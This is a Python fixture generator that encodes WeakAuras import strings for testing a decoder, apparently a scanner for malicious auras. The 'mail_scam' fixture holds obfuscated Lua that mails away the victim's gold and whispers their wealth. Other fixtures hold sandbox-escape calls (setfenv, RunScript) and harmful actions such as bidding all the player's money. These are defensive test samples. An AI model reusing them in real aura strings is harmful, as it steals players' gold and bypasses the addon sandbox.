#!/usr/bin/env python3
"""Writes tests/fixtures/auras/*.txt: WeakAuras import strings made by the real Lua libraries.

Needs `pip install lupa` (embedded Lua 5.1, the same Lua as WoW) and clones of LibDeflate,
LibSerialize, Ace3 (AceSerializer-3.0) and LibCompress (for the pre-2018 format; Plater ships it). The strings are encoded exactly the way WeakAuras'
Transmission.lua does it, so the decoder is tested against the real format, not our idea of it.

  python tools/make_aura_fixtures.py --libs /path/to/libs   # folder with LibDeflate/, LibSerialize/, Ace3/, LibCompress/
"""

import argparse
from pathlib import Path

from lupa import lua51

ROOT = Path(__file__).resolve().parents[1]
OUT = ROOT / "tests" / "fixtures" / "auras"

PRELUDE = r"""
LibStub = { libs = {} }
function LibStub:NewLibrary(major, minor) local t = {} self.libs[major] = t return t, nil end
function LibStub:GetLibrary(major, silent) return self.libs[major] end
setmetatable(LibStub, { __call = function(self, major) return self.libs[major] end })
-- WoW's "bit" library (LuaBitOp) for LibCompress, on unsigned 32-bit numbers
local function tobits(f) return function(a, b)
  local r, p = 0, 1
  a, b = a % 4294967296, b % 4294967296
  for _ = 1, 32 do
    local x, y = a % 2, b % 2
    r = r + f(x, y) * p
    a, b, p = (a - x) / 2, (b - y) / 2, p * 2
  end
  return r
end end
bit = {
  band = tobits(function(x, y) return x * y end),
  bor = tobits(function(x, y) return (x + y > 0) and 1 or 0 end),
  bxor = tobits(function(x, y) return (x + y) % 2 end),
  lshift = function(a, n) return (a * 2 ^ (n % 32)) % 4294967296 end,
  rshift = function(a, n) return math.floor((a % 4294967296) / 2 ^ (n % 32)) end,
}
CreateFrame = function() return { SetScript = function() end, Hide = function() end, Show = function() end, IsShown = function() return true end } end
sort, tinsert, tremove = table.sort, table.insert, table.remove
"""

ENCODERS = r"""
local LD = LibStub("LibDeflate")
local LS = LibStub("LibSerialize")
local AS = LibStub("AceSerializer-3.0")
function encode_v2(t)
  local s = LS:SerializeEx({ errorOnUnserializableType = false }, t)
  return "!WA:2!" .. LD:EncodeForPrint(LD:CompressDeflate(s, { level = 9 }))
end
function encode_v1(t)
  return "!" .. LD:EncodeForPrint(LD:CompressDeflate(AS:Serialize(t)))
end
-- Pre-2018 WeakAuras: LibCompress, then WeakAuras' own 6-bit encoding (bits taken low first).
local B64 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789()"
local function encodeB64(s)
  local out, acc, n = {}, 0, 0
  for i = 1, #s do
    acc = acc + s:byte(i) * 2 ^ n
    n = n + 8
    while n >= 6 do
      local v = acc % 64
      out[#out + 1] = B64:sub(v + 1, v + 1)
      acc, n = (acc - v) / 64, n - 6
    end
  end
  if n > 0 then out[#out + 1] = B64:sub(acc + 1, acc + 1) end
  return table.concat(out)
end
function encode_v0_lzw(t) return encodeB64(LibStub("LibCompress"):CompressLZW(AS:Serialize(t))) end
function encode_v0_huffman(t) return encodeB64(LibStub("LibCompress"):CompressHuffman(AS:Serialize(t))) end
"""

# Each fixture is Lua that returns the "transmit" table WeakAuras builds in DisplayToString.
LIB_FILES = (
    "LibDeflate/LibDeflate.lua",
    "LibSerialize/LibSerialize.lua",
    "Ace3/AceSerializer-3.0/AceSerializer-3.0.lua",
    "LibCompress/LibCompress.lua",
)

FIXTURES = {
    # A normal group: custom trigger, custom text, an animation function, many value types.
    "clean": (
        "v2",
        r"""
local shared = { r = 1, g = 0.82, b = 0, a = 1 }
local d = {
  id = "Raid Cooldowns", uid = "aBcDeFgHiJk", regionType = "dynamicgroup", grow = "CUSTOM",
  customGrow = "function(newPositions, activeRegions)\n  for i, r in ipairs(activeRegions) do newPositions[i] = { 0, -i * 32 } end\nend",
  controlledChildren = { "Rebirth CD", "Innervate CD" },
  url = "https://wago.io/AbCdEf123/4", version = 4, semver = "1.0.3",
  desc = "Tracks battle res and innervate cooldowns in your raid.",
  xOffset = -300, yOffset = 70000, scale = 1.5, alpha = 0.25, big = 2^40, neg = -2^40, tiny = -12, frac = -0.1,
  color = shared, borderColor = shared,
  load = { use_never = false, size = { multi = { party = true, raid = true } } },
  information = { forceEvents = true, ignoreOptionsEventErrors = true },
  triggers = { disjunctive = "any", activeTriggerMode = -10 },
  flags = { [true] = "yes", [1] = "one", [2.5] = "half", [false] = "no", [1e-05] = "tiny", customFunc = "function() return 1 end" },
  odd = { [3] = { custom = "return 1" }, ["with space"] = { custom = "return 2" }, [true] = { custom = "return 3" },
          [0.5] = { custom = "return 4" }, [1e-05] = { custom = "return 5" }, [-7] = { custom = "return 6" } },
}
local c1 = {
  id = "Rebirth CD", uid = "child000001", parent = "Raid Cooldowns", regionType = "icon",
  triggers = {
    { trigger = { type = "custom", custom_type = "stateupdate", event = "STATUS", events = "SPELL_UPDATE_COOLDOWN UNIT_AURA:player",
      custom = "function(allstates, event, ...)\n  local info = C_Spell.GetSpellCooldown(20484)\n  allstates[''] = { show = info.duration > 0, changed = true, progressType = 'timed', duration = info.duration, expirationTime = info.startTime + info.duration, autoHide = true }\n  return true\nend",
      customVariables = "{ expirationTime = true, duration = true }" },
      untrigger = {} },
    disjunctive = "all",
  },
  color = shared,
  actions = { init = { do_custom = true, custom = "aura_env.spell = 20484" }, start = { do_message = true, message_type = "PRINT", message = "Rebirth ready" }, finish = {} },
  animation = { start = { type = "custom", use_alpha = true, alphaType = "custom", alphaFunc = "function(progress, start, delta)\n  return start + progress * delta\nend" }, main = { type = "none" }, finish = { type = "none" } },
  conditions = { { check = { trigger = 1, variable = "show", value = 1 }, changes = { { property = "desaturate", value = true } } } },
  subRegions = { { type = "subbackground" }, { type = "subtext", text_text = "%p", text_color = { 1, 1, 1, 1 } } },
}
local c2 = {
  id = "Innervate CD", uid = "child000002", parent = "Raid Cooldowns", regionType = "text",
  displayText = "%c", customText = "function()\n  return aura_env.text or ''\nend", customTextUpdate = "event",
  triggers = { { trigger = { type = "unit", event = "Cooldown Progress (Spell)", spellName = 29166, use_genericShowOn = true, genericShowOn = "showAlways" }, untrigger = {} } },
  color = shared,
  longnote = string.rep("This aura has a long description so the string uses the 16-bit length. ", 6),
}
return { m = "d", d = d, v = 2000, s = "5.19.10", c = { c1, c2 } }
""",
    ),
    # The classic scam: init action sends your gold by mail and whispers you to someone, hidden a bit.
    "mail_scam": (
        "v2",
        r"""
local d = {
  id = "Free Gold Tracker", uid = "scam0000001", regionType = "text", displayText = "Gold: %c",
  customText = "function() return GetMoney() end",
  triggers = { { trigger = { type = "custom", custom_type = "status", check = "update", custom = "function() return true end" }, untrigger = {} } },
  actions = {
    init = { do_custom = true, custom = [[
local f = CreateFrame("Frame")
f:RegisterEvent("MAIL_SHOW")
f:SetScript("OnEvent", function()
  local n = "Send" .. "Mail"
  SetSendMailMoney(GetMoney() - 100)
  _G[n]("Goldbuyer", "hi", "")
end)
local code = string.char(83, 101, 110, 100, 77, 97, 105, 108)
loadstring(code)()
]] },
    start = { do_message = true, message_type = "WHISPER", message_dest = "Goldbuyer", message = "%n has %c gold" },
    finish = {},
  },
}
d.loop = d
return { m = "d", d = d, v = 1421, s = "5.19.10" }
""",
    ),
    # Chat from a condition and from custom code, plus sandbox escapes WeakAuras blocks.
    "chat_and_blocked": (
        "v2",
        r"""
local d = {
  id = "Pull Timer Helper", uid = "chat0000001", regionType = "icon",
  triggers = { { trigger = { type = "event", event = "Chat Message" }, untrigger = {} } },
  conditions = {
    { check = { trigger = -1, variable = "customcheck", value = "function(states) return getfenv(0).SendChatMessage ~= nil end" },
      changes = {
        { property = "chat", value = { message_type = "GUILD", message = "Pulling!", custom = "function() return DEFAULT_CHAT_FRAME end" } },
        { property = "customcode", value = { custom = "setfenv(1, _G)\nRunScript('print(1)')" } },
      } },
  },
  actions = { init = { do_custom = true, custom = "local who = C_FriendList.GetNumFriends()\nSendChatMessage(who, 'WHISPER', nil, 'Someone')" }, start = {}, finish = {} },
  newerField = { customThing = "function() return C_PetInfo.PetAbandon end", customLabel = "just a label" },
}
return { m = "d", d = d, v = 1421, s = "5.19.10" }
""",
    ),
    # An old (2019-2020) string: "!" + LibDeflate + AceSerializer.
    "legacy_v1": (
        "v1",
        r"""
local d = {
  id = "Old Combo Points", uid = "legacy00001", regionType = "aurabar",
  trigger = { type = "custom", custom = "function()\n  return GetComboPoints('player', 'target') > 0\nend", customDuration = "function() return UnitPower('player', 4), 5, true end" },
  additional_triggers = {},
  actions = { start = { do_custom = true, custom = "GuildUninvite('Somebody')" }, finish = {} },
  name = "Combo ~ points ^ with \1 escapes", width = 200.5, height = -3,
}
return { m = "d", d = d, v = 1421, s = "2.17.6" }
""",
    ),
    # Pre-2018 strings (no "!"): LibCompress LZW and Huffman.
    "legacy_v0_lzw": (
        "v0_lzw",
        r"""
local d = {
  id = "Auction Helper", regionType = "text",
  trigger = { type = "custom", custom = "function() return true end" },
  actions = { start = { do_custom = true, custom = "PlaceAuctionBid('list', 1, GetMoney())" }, finish = {} },
  customText = "function() return 'bids: ' .. aura_env.n end",
}
return { m = "d", d = d, v = 1421, s = "2.4.0" }
""",
    ),
    "legacy_v0_huffman": (
        "v0_huffman",
        r"""
local d = {
  id = "Old Mana Bar", regionType = "aurabar", width = 210, height = 18, barColor = { 0, 0.4, 1, 1 },
  trigger = { type = "custom", custom = "function()\n  return UnitPower('player', 0) < UnitPowerMax('player', 0)\nend",
              customDuration = "function() return UnitPower('player', 0), UnitPowerMax('player', 0), true end" },
  desc = string.rep("A plain mana bar for healers. ", 8),
}
return { m = "d", d = d, v = 1421, s = "2.2.1.0" }
""",
    ),
}


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--libs", type=Path, required=True)
    args = ap.parse_args()
    lua = lua51.LuaRuntime(unpack_returned_tuples=True)
    lua.execute(PRELUDE)
    for rel in LIB_FILES:
        lua.execute((args.libs / rel).read_text(encoding="utf-8"))
    lua.execute(ENCODERS)
    OUT.mkdir(parents=True, exist_ok=True)
    for name, (fmt, src) in FIXTURES.items():
        transmit = lua.execute(src)
        s = lua.globals()["encode_" + fmt](transmit)
        (OUT / f"{name}.txt").write_text(s + "\n", encoding="utf-8")
        print(f"{name}: {len(s)} chars")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
